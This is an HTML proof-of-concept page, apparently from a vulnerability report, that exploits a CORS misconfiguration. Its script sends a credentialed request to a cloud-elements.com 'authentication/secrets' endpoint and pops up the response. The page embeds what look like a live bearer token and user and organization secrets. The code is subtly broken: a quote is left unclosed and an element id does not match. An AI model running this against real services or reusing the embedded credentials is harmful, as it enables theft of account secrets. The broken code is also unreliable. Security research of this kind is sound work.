<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "https://snapshot.cloud-elements.com/elements/authentication/secrets", true);
         xhttp.withCredentials = true;
         xhttp.setRequestHeader("Authorization", "Bearer AyyF6sBuFp8w/OH30wHYBs1rGgPoGakwqLBY/maGPaT8IS5siPWREaHdajpYkNeWeYAKxRUi2h5L/Fw3DcCwIQokYEm/5FA+fw0TN8lQq9t1fo1EGHwLzR3HsS9pRHtjgczSfIV/+cdg/T8SWAR+mZYBwUeOIl/RpXqBFWGdKLZlXOkS7b8pU/XmI+GwQw2Q0OdtDMSRSVE2zMLkb5JcIZNedzxRSWtdUzGSb85vZV/+TfBoFFLHFXW3VmzW5Et0Xb+ASqKT53lK7tfMlASr/wuPcTwhq6UEgkmKaZ2xxYKqduMcU6CcHf+fW1SU//+2UfbNRm43BhN+pO0x8xiAXDl78+/DHj8SlV5ZCXZCCbkbtBiDdLMq387bjE6Gf6wX6OkDs6U92ajnmnR1+6rXPpAjwIerx8h73sdIBOvWPuyI , User +n6EjxRrIEgjlclo2l9eIWycrZJDh3WUJ3D1h7kBHVA=, Organization 30b8a3c9ab8763733cfdf651bf701a24);
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
